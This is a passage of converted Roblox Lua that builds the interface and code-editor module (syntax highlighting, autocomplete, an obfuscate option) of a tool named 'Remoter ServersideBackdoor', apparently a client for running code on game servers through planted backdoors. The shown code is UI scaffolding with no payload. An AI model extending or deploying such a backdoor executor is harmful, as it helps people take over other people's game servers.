-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.CustomInput.LineHighlighter
G2L["43"] = Instance.new("Frame", G2L["41"]);
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Size"] = UDim2.new(1, 5, 0, 14);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Name"] = [[LineHighlighter]];
G2L["43"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.CustomInput.LineHighlighter.Outline
G2L["44"] = Instance.new("UIStroke", G2L["43"]);
G2L["44"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["44"]["Name"] = [[Outline]];
G2L["44"]["Color"] = Color3.fromRGB(46, 46, 46);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.CustomInput.LineHighlighter.UIPadding
G2L["45"] = Instance.new("UIPadding", G2L["43"]);
G2L["45"]["PaddingLeft"] = UDim.new(0, 10);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Lines
G2L["46"] = Instance.new("ModuleScript", G2L["3d"]);
G2L["46"]["Name"] = [[Lines]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Lines.Highlighter
G2L["47"] = Instance.new("Frame", G2L["46"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Size"] = UDim2.new(1, 5, 0, 14);
G2L["47"]["Position"] = UDim2.new(0, -2, 0, 0);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Name"] = [[Highlighter]];
G2L["47"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Lines.Highlighter.UIPadding
G2L["48"] = Instance.new("UIPadding", G2L["47"]);
G2L["48"]["PaddingLeft"] = UDim.new(0, 10);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Lines.Highlighter.Outline
G2L["49"] = Instance.new("UIStroke", G2L["47"]);
G2L["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["49"]["Name"] = [[Outline]];
G2L["49"]["Color"] = Color3.fromRGB(46, 46, 46);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Indenter
G2L["4a"] = Instance.new("ModuleScript", G2L["3d"]);
G2L["4a"]["Name"] = [[Indenter]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete
G2L["4b"] = Instance.new("ModuleScript", G2L["3d"]);
G2L["4b"]["Name"] = [[Autocomplete]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.Language
G2L["4c"] = Instance.new("ModuleScript", G2L["4b"]);
G2L["4c"]["Name"] = [[Language]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.Palete
G2L["4d"] = Instance.new("TextButton", G2L["4b"]);
G2L["4d"]["RichText"] = true;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4d"]["TextSize"] = 14;
G2L["4d"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["ZIndex"] = 6;
G2L["4d"]["BackgroundTransparency"] = 1;
G2L["4d"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[getfenv]];
G2L["4d"]["Name"] = [[Palete]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.Palete.UIPadding
G2L["4e"] = Instance.new("UIPadding", G2L["4d"]);
G2L["4e"]["PaddingLeft"] = UDim.new(0, 35);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.Palete.Icon
G2L["4f"] = Instance.new("ImageLabel", G2L["4d"]);
G2L["4f"]["ZIndex"] = 6;
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4f"]["ImageColor3"] = Color3.fromRGB(255, 0, 0);
G2L["4f"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["4f"]["Image"] = [[rbxassetid://119893371750481]];
G2L["4f"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["BackgroundTransparency"] = 1;
G2L["4f"]["Name"] = [[Icon]];
G2L["4f"]["Position"] = UDim2.new(0, -10, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.Palete.UICorner
G2L["50"] = Instance.new("UICorner", G2L["4d"]);
G2L["50"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame
G2L["51"] = Instance.new("ScrollingFrame", G2L["4b"]);
G2L["51"]["Active"] = true;
G2L["51"]["ZIndex"] = 5;
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["51"]["Name"] = [[AutocompleteFrame]];
G2L["51"]["ScrollBarImageTransparency"] = 1;
G2L["51"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["51"]["Size"] = UDim2.new(0, 200, 0, 0);
G2L["51"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["ScrollBarThickness"] = 0;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.UICorner
G2L["52"] = Instance.new("UICorner", G2L["51"]);
G2L["52"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.UIStroke
G2L["53"] = Instance.new("UIStroke", G2L["51"]);
G2L["53"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["53"]["Color"] = Color3.fromRGB(51, 51, 51);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.KeywordInfo
G2L["54"] = Instance.new("ScrollingFrame", G2L["51"]);
G2L["54"]["Active"] = true;
G2L["54"]["ZIndex"] = 6;
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["Name"] = [[KeywordInfo]];
G2L["54"]["AutomaticCanvasSize"] = Enum.AutomaticSize.X;
G2L["54"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["ScrollBarThickness"] = 2;
G2L["54"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.KeywordInfo.TextLabel
G2L["55"] = Instance.new("TextLabel", G2L["54"]);
G2L["55"]["ZIndex"] = 7;
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 12;
G2L["55"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["55"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["55"]["BackgroundTransparency"] = 1;
G2L["55"]["RichText"] = true;
G2L["55"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[local :: assign a variable, EX: local var = 0]];
G2L["55"]["AutomaticSize"] = Enum.AutomaticSize.X;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.KeywordInfo.TextLabel.UIPadding
G2L["56"] = Instance.new("UIPadding", G2L["55"]);
G2L["56"]["PaddingRight"] = UDim.new(0, 10);
G2L["56"]["PaddingLeft"] = UDim.new(0, 10);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.Paletes
G2L["57"] = Instance.new("ScrollingFrame", G2L["51"]);
G2L["57"]["Active"] = true;
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["Name"] = [[Paletes]];
G2L["57"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["57"]["Size"] = UDim2.new(1, 0, 0, 0);
G2L["57"]["ScrollBarImageColor3"] = Color3.fromRGB(236, 236, 236);
G2L["57"]["Position"] = UDim2.new(0, 0, 0, 30);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["ScrollBarThickness"] = 2;
G2L["57"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Autocomplete.AutocompleteFrame.Paletes.UIListLayout
G2L["58"] = Instance.new("UIListLayout", G2L["57"]);
G2L["58"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
G2L["58"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Shared
G2L["59"] = Instance.new("ModuleScript", G2L["3d"]);
G2L["59"]["Name"] = [[Shared]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Methods
G2L["5a"] = Instance.new("Folder", G2L["3d"]);
G2L["5a"]["Name"] = [[Methods]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Methods.Beautify
G2L["5b"] = Instance.new("ModuleScript", G2L["5a"]);
G2L["5b"]["Name"] = [[Beautify]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Methods.Obfuscate
G2L["5c"] = Instance.new("ModuleScript", G2L["5a"]);
G2L["5c"]["Name"] = [[Obfuscate]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox
G2L["5d"] = Instance.new("Frame", G2L["3d"]);
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["ClipsDescendants"] = true;
G2L["5d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Name"] = [[Textbox]];
G2L["5d"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main
G2L["5e"] = Instance.new("Frame", G2L["5d"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Name"] = [[Main]];
G2L["5e"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.TextboxLayout
G2L["5f"] = Instance.new("UIListLayout", G2L["5e"]);
G2L["5f"]["Name"] = [[TextboxLayout]];
G2L["5f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Lines
G2L["60"] = Instance.new("ScrollingFrame", G2L["5e"]);
G2L["60"]["Active"] = true;
G2L["60"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["60"]["ZIndex"] = 2;
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["60"]["ScrollingEnabled"] = false;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["60"]["Name"] = [[Lines]];
G2L["60"]["ScrollBarImageTransparency"] = 1;
G2L["60"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["60"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["60"]["Size"] = UDim2.new(0, 50, 1, 0);
G2L["60"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["ScrollBarThickness"] = 0;
G2L["60"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Lines.Padded
G2L["61"] = Instance.new("Folder", G2L["60"]);
G2L["61"]["Name"] = [[Padded]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Lines.Label
G2L["62"] = Instance.new("TextLabel", G2L["60"]);
G2L["62"]["ZIndex"] = 4;
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["TextColor3"] = Color3.fromRGB(148, 148, 148);
G2L["62"]["BackgroundTransparency"] = 1;
G2L["62"]["RichText"] = true;
G2L["62"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[1]];
G2L["62"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["62"]["Name"] = [[Label]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Lines.Label.UIStroke
G2L["63"] = Instance.new("UIStroke", G2L["62"]);
G2L["63"]["Transparency"] = 1;
G2L["63"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["63"]["Color"] = Color3.fromRGB(51, 51, 51);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Lines.Label.UIPadding
G2L["64"] = Instance.new("UIPadding", G2L["62"]);
G2L["64"]["PaddingRight"] = UDim.new(0.5, 7);
G2L["64"]["PaddingLeft"] = UDim.new(0.5, 10);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Lines.UIPadding
G2L["65"] = Instance.new("UIPadding", G2L["60"]);
G2L["65"]["PaddingTop"] = UDim.new(0, 5);
G2L["65"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Textbox
G2L["66"] = Instance.new("ScrollingFrame", G2L["5e"]);
G2L["66"]["Active"] = true;
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["66"]["Name"] = [[Textbox]];
G2L["66"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["66"]["AutomaticCanvasSize"] = Enum.AutomaticSize.X;
G2L["66"]["Size"] = UDim2.new(1, -50, 1, 0);
G2L["66"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["ScrollBarThickness"] = 7;
G2L["66"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Textbox.Input
G2L["67"] = Instance.new("TextBox", G2L["66"]);
G2L["67"]["Name"] = [[Input]];
G2L["67"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["67"]["ZIndex"] = 2;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextTransparency"] = 1;
G2L["67"]["TextSize"] = 14;
G2L["67"]["ShowNativeInput"] = false;
G2L["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["67"]["MultiLine"] = true;
G2L["67"]["ClearTextOnFocus"] = false;
G2L["67"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[]];
G2L["67"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Textbox.Input.UIPadding
G2L["68"] = Instance.new("UIPadding", G2L["67"]);
G2L["68"]["PaddingTop"] = UDim.new(0, 5);
G2L["68"]["PaddingRight"] = UDim.new(0, 5);
G2L["68"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Unaligned
G2L["69"] = Instance.new("Folder", G2L["5e"]);
G2L["69"]["Name"] = [[Unaligned]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Unaligned.Shadow
G2L["6a"] = Instance.new("Frame", G2L["69"]);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Size"] = UDim2.new(0, 50, 1, 0);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Name"] = [[Shadow]];
G2L["6a"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Main.Unaligned.Shadow.DropShadow
G2L["6b"] = Instance.new("ImageLabel", G2L["6a"]);
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["SliceCenter"] = Rect.new(49, 49, 450, 450);
G2L["6b"]["ScaleType"] = Enum.ScaleType.Slice;
G2L["6b"]["ImageTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6b"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6b"]["Image"] = [[rbxassetid://6015897843]];
G2L["6b"]["Size"] = UDim2.new(1, 47, 1, 47);
G2L["6b"]["BackgroundTransparency"] = 1;
G2L["6b"]["Name"] = [[DropShadow]];
G2L["6b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Others
G2L["6c"] = Instance.new("Frame", G2L["5d"]);
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["ClipsDescendants"] = true;
G2L["6c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Name"] = [[Others]];
G2L["6c"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Others.Hidden
G2L["6d"] = Instance.new("Frame", G2L["6c"]);
G2L["6d"]["Visible"] = false;
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Name"] = [[Hidden]];
G2L["6d"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Others.Hidden.Icon
G2L["6e"] = Instance.new("ImageLabel", G2L["6d"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6e"]["Image"] = [[http://www.roblox.com/asset/?id=13571270194]];
G2L["6e"]["Size"] = UDim2.new(0.4, 0, 0.4, 0);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["BackgroundTransparency"] = 1;
G2L["6e"]["Name"] = [[Icon]];
G2L["6e"]["Position"] = UDim2.new(0.5, 0, 0.3, 0);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Textbox.Others.Hidden.TextLabel
G2L["6f"] = Instance.new("TextLabel", G2L["6d"]);
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextSize"] = 20;
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["BackgroundTransparency"] = 1;
G2L["6f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6f"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["Text"] = [[This content is hidden!]];
G2L["6f"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["6f"]["Position"] = UDim2.new(0.5, 0, 0.55, 0);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.TabControl
G2L["70"] = Instance.new("ModuleScript", G2L["3c"]);
G2L["70"]["Name"] = [[TabControl]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Resuponshibu
G2L["71"] = Instance.new("ModuleScript", G2L["3c"]);
G2L["71"]["Name"] = [[Resuponshibu]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv
G2L["72"] = Instance.new("ModuleScript", G2L["3c"]);
G2L["72"]["Name"] = [[SecureEnv]];

-- Tags
CollectionService:AddTag(G2L["72"], [[Packets]]);

-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.EnvironmentHandler
G2L["73"] = Instance.new("ModuleScript", G2L["72"]);
G2L["73"]["Name"] = [[EnvironmentHandler]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.Configuration
G2L["74"] = Instance.new("Configuration", G2L["72"]);



-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.Configuration.SecureNum
G2L["75"] = Instance.new("DoubleConstrainedValue", G2L["74"]);
G2L["75"]["Name"] = [[SecureNum]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.Configuration.NewEnv
G2L["76"] = Instance.new("StringValue", G2L["74"]);
G2L["76"]["Name"] = [[NewEnv]];
G2L["76"]["Value"] = [[EnvironmentHandler]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.Configuration.EnvRun
G2L["77"] = Instance.new("DoubleConstrainedValue", G2L["74"]);
G2L["77"]["Name"] = [[EnvRun]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.Configuration.NumberService
G2L["78"] = Instance.new("DoubleConstrainedValue", G2L["74"]);
G2L["78"]["Name"] = [[NumberService]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.SecureEnv.Configuration.SecureLocation
G2L["79"] = Instance.new("DoubleConstrainedValue", G2L["74"]);
G2L["79"]["Name"] = [[SecureLocation]];


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
	local ModuleState = G2L_MODULES[Module];
	if ModuleState then
		if not ModuleState.Required then
			ModuleState.Required = true;
			ModuleState.Value = ModuleState.Closure();
		end
		return ModuleState.Value;
	end;
	return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["3d"]] = {
	Closure = function()
		local script = G2L["3d"];--[[
	██╗░░██╗░█████╗░██████╗░░█████╗░██████╗░░█████╗░██╗░░██╗██╗░░██╗██╗░░░██╗░██████╗██╗░░░██╗
	██║░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║░██╔╝██║░░░██║██╔════╝██║░░░██║
	█████═╝░██║░░██║██║░░██║██║░░██║██████╦╝██║░░██║█████═╝░█████═╝░██║░░░██║╚█████╗░██║░░░██║
	██╔═██╗░██║░░██║██║░░██║██║░░██║██╔══██╗██║░░██║██╔═██╗░██╔═██╗░██║░░░██║░╚═══██╗██║░░░██║
	██║░╚██╗╚█████╔╝██████╔╝╚█████╔╝██████╦╝╚█████╔╝██║░╚██╗██║░╚██╗╚██████╔╝██████╔╝╚██████╔╝
	╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░░╚═════╝░
	-- V2.0.0

	// サーバーの IDE テキストボックス \\
	
	-- ._.l5 の Discord
	-- 0_6lI の Roblox

	- クレジット -
	* Boatbomber と iK4oS: ハイライト
	* Maidenless/RadiatedExodus: オートコンプリートとブラケット オートコンプリート (https://devforum.roblox.com/t/making-a-lua-editor-with-autocomplete/2073946)
	* ceat_ceat: カスタム入力位置

	- TODO -
	* 実際に機能する自動インデンターを作成する
	* オートコンプリーターを終了する
	
	-- You can translate this if you want
]]

		local Kodobokkusu = {}
		Kodobokkusu.__index = Kodobokkusu

		function Kodobokkusu.new(data)
			local self = setmetatable({}, Kodobokkusu)

			self.Meta = {}
			self.Modules = {}
			self.Connections = {}
			self.Services = {}
			self.States = {}
			self.Data = data

			if self.Data.Parent then else return end

			--// 変数の開始 \\--
			self.Modules = {
				Highlighter = require(script.Highlighter),
				Autocomplete = require(script.Autocomplete),
				Lines = require(script.Lines),
				Indenter = require(script.Indenter),
				CustomInput = require(script.CustomInput),
				Shared = require(script.Shared),

				Beautify = require(script.Methods.Beautify),
				Obfuscate = require(script.Methods.Obfuscate),
			}
			self.Services = {
				RunService = game:GetService("RunService"),
				UserInputService = game:GetService("UserInputService"),
				TextService = game:GetService("TextService"),
			}
			self.States = {
				Focused = false,
				RemovingText = false,
				AddingText = false,
				IsTyping = false,
				MovingCursor = false,
				AutocompleteWasVisible = false,
				IsSelecting = false,

				FocusedFirst = false,
				WasWritten = false,

				HoldingDownMouse = false,
				MouseDragging = false,
				KeybindScrolling = false,

				SyntaxVisible = true,
				AutocompleteEnabled = true,
				AutoCloseBracketDebounce = true,

				PreventFocus = false,
			}
			self.Values = {
				LastText = 0,
				TypingTick = 0,
				StartDragTime = 0,
				TextSize = 0,
				LastCursorPosition = 0,
				SelectionStart = 0,
				SelectionEnd = 0,

				BeforeText = "",
			}
			self.Brackets = {
				["\""] = "\"";
				["'"] = "'";
				["("] = ")";
				["["] = "]";
				["{"] = "}";
				["`"] = "`";
			}
			self.Config = {
				CURSOR_SPEED = 0.1,
				TEXT_SIZE = 14,

				FOLD_MARKER = "▼ ",
				UNFOLD_MARKER = "▶ ",

				HIGHLIGHT_MODE = "single",

				HOLD_DOWN_SMOOTHNESS = .15,
			}
			self.Properties = {
				PreviousSelection = "",
			}
			self.Theme = {
				THEME_COLOR = Color3.fromRGB(255, 0, 0),

				TEXT_COLOR = Color3.fromRGB(235, 235, 235),
				SHADED_TEXT = Color3.fromRGB(150, 150, 150),

				OUTLINE = Color3.fromRGB(50, 50, 50),

				DARK_BACKGROUND = Color3.fromRGB(150, 150, 150),
				SELECT_BACKGROUND = Color3.fromRGB(235, 235, 235),
				SHADOW_COLOR = Color3.fromRGB(0, 0, 0),

				CURSOR_COLOR = Color3.fromRGB(255, 255, 255),

				LINE_NUMBER_HIGHLIGHT_TRANSPARENCY = "semi",

				LINES_X_SIZE = 25,
				LINE_HIGHLIGHTER_OUTLINE_TRANSPARENCY = 1,
				CURSOR_INACTIVE_TRANSPARENCY = .75,

				LINES_SHADOW_ENABLED = true,
				LINES_SHADOW_TRANSPARENCY = .5,
			}
			self._onEditFunctions = {}
			self._selectionFrames = {}
			self._wordHighlights = {}

			local codeEditor = script.Textbox:Clone()
			codeEditor.Parent = self.Data.Parent
			local main = codeEditor.Main
			local others = codeEditor.Others

			self.Main = main
			self.Others = others

			self.CodeEditor = codeEditor
			self.Editor = main.Textbox
